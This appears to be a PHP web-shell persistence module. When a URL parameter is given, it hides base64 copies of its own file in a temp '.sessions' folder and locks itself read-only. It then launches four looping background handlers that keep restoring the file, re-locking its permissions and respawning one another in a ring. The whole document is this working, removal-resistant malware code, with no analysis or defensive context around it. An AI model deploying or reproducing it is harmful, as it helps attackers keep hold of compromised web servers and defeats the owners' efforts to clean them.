<?php
$fungsi = [];
$fungsi[0] = function() { return getcwd(); };
$fungsi[31] = function() { return sys_get_temp_dir(); };
$fungsi[32] = 'base64_decode';
$fungsi[33] = 'base64_encode';

function cmd($command) {
    return shell_exec($command);
}

function success() {
    echo "Success\n";
}

function failed() {
    echo "Failed\n";
}

function remove_dot($str) {
    return str_replace('.', '', $str);
}

if (isset($_GET['lockfilemanager'])) {
    global $fungsi;
    $curFile  = trim(basename($_SERVER["SCRIPT_FILENAME"]));
    $basePath = $fungsi[0]();
    $TmpNames = $fungsi[31]();

    @mkdir($TmpNames . "/.sessions", 0755, true);

    $mainTextName    = $fungsi[33]($basePath . remove_dot($curFile) . '-text');
    $h1TextName      = $fungsi[33]($basePath . remove_dot($curFile) . '-h1');
    $h2TextName      = $fungsi[33]($basePath . remove_dot($curFile) . '-h2');
    $h3TextName      = $fungsi[33]($basePath . remove_dot($curFile) . '-h3');
    $h4TextName      = $fungsi[33]($basePath . remove_dot($curFile) . '-h4');

    $mainTextFile    = $TmpNames . "/.sessions/." . $mainTextName;
    $h1FileName      = $TmpNames . "/.sessions/." . $h1TextName . ".php";
    $h2FileName      = $TmpNames . "/.sessions/." . $h2TextName . ".php";
    $h3FileName      = $TmpNames . "/.sessions/." . $h3TextName . ".php";
    $h4FileName      = $TmpNames . "/.sessions/." . $h4TextName . ".php";

    @unlink($mainTextFile);
    @unlink($h1FileName);
    @unlink($h2FileName);
    @unlink($h3FileName);
    @unlink($h4FileName);

    $originalContent = file_get_contents($curFile);
    file_put_contents($mainTextFile, base64_encode($originalContent));

    chmod($curFile, 0444);
    function generate_handler_code($basePath, $curFile, $TmpNames, $mainTextFile, $thisHandlerFile, $nextHandlerFile, $nextHandlerBase64Name) {
        return '
<?php
@ini_set("max_execution_time", 0);

function gecko_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}

$basePath = "'.$basePath.'";
$curFile  = "'.$curFile.'";
$TmpNames = "'.$TmpNames.'";
$mainText = "'.$mainTextFile.'";

$thisHandler = "'.$thisHandlerFile.'";
$nextHandler = "'.$nextHandlerFile.'";
$nextHandlerBase64 = "'.$nextHandlerBase64Name.'";

$nextHandlerContentB64 = @file_get_contents($nextHandlerBase64);

while (true) {
    if (!file_exists($basePath . "/" . $curFile)) {
        $encodedText = @file_get_contents($mainText);
        if ($encodedText !== false) {
            $decoded = base64_decode($encodedText);
            file_put_contents($basePath . "/" . $curFile, $decoded);
            chmod($basePath . "/" . $curFile, 0444);
        }
    }

    if (gecko_perm($basePath . "/" . $curFile) != "0444") {
        chmod($basePath . "/" . $curFile, 0444);
    }
    if (!file_exists($nextHandler)) {
        if ($nextHandlerContentB64 !== false) {
            $decodedHandler = base64_decode($nextHandlerContentB64);
            file_put_contents($nextHandler, $decodedHandler);
            chmod($nextHandler, 0555);
            exec(PHP_BINARY." ".escapeshellarg($nextHandler)." > /dev/null 2>/dev/null &");
        }
    }
    if (file_exists($nextHandler)) {
        exec(PHP_BINARY." ".escapeshellarg($nextHandler)." > /dev/null 2>/dev/null &");
    }

    sleep(2);
}
';
    }
    $h1Code = generate_handler_code($basePath, $curFile, $TmpNames, $mainTextFile, $h1FileName, $h2FileName, $TmpNames . "/.sessions/." . $h2TextName);
    $h2Code = generate_handler_code($basePath, $curFile, $TmpNames, $mainTextFile, $h2FileName, $h3FileName, $TmpNames . "/.sessions/." . $h3TextName);
    $h3Code = generate_handler_code($basePath, $curFile, $TmpNames, $mainTextFile, $h3FileName, $h4FileName, $TmpNames . "/.sessions/." . $h4TextName);
    $h4Code = generate_handler_code($basePath, $curFile, $TmpNames, $mainTextFile, $h4FileName, $h1FileName, $TmpNames . "/.sessions/." . $h1TextName);

    file_put_contents($TmpNames . "/.sessions/." . $h1TextName, base64_encode($h1Code));
    file_put_contents($TmpNames . "/.sessions/." . $h2TextName, base64_encode($h2Code));
    file_put_contents($TmpNames . "/.sessions/." . $h3TextName, base64_encode($h3Code));
    file_put_contents($TmpNames . "/.sessions/." . $h4TextName, base64_encode($h4Code));

    $w1 = file_put_contents($h1FileName, $h1Code);
    $w2 = file_put_contents($h2FileName, $h2Code);
    $w3 = file_put_contents($h3FileName, $h3Code);
    $w4 = file_put_contents($h4FileName, $h4Code);

    if ($w1 !== false && $w2 !== false && $w3 !== false && $w4 !== false) {
        chmod($h1FileName, 0555);
        chmod($h2FileName, 0555);
        chmod($h3FileName, 0555);
        chmod($h4FileName, 0555);

        cmd(PHP_BINARY . " " . escapeshellarg($h1FileName) . " > /dev/null 2>/dev/null &");
        cmd(PHP_BINARY . " " . escapeshellarg($h2FileName) . " > /dev/null 2>/dev/null &");
        cmd(PHP_BINARY . " " . escapeshellarg($h3FileName) . " > /dev/null 2>/dev/null &");
        cmd(PHP_BINARY . " " . escapeshellarg($h4FileName) . " > /dev/null 2>/dev/null &");
        success();
    } else {
        failed();
    }
}
